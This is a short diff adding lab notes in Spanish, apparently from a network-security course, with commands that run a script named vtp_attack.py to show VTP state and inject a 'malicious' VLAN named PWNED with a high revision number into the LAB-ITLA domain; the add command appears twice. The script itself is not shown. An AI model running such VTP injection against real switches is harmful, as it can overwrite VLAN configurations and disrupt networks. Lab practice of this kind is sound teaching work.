@@ -1,0 +1,5 @@
+Ver estado inicial
+sudo python3 ~/netsec-lab/scripts/vtp_attack.py -i eth0 -m show
+Agregar VLAN maliciosa
+sudo python3 ~/netsec-lab/scripts/vtp_attack.py -i eth0 -m add --vlan-id 999 --vlan-name PWNED --domain LAB-ITLA --revision 100
+sudo python3 ~/netsec-lab/scripts/vtp_attack.py -i eth0 -m add --vlan-id 999 --vlan-name PWNED --domain LAB-ITLA --revision 100
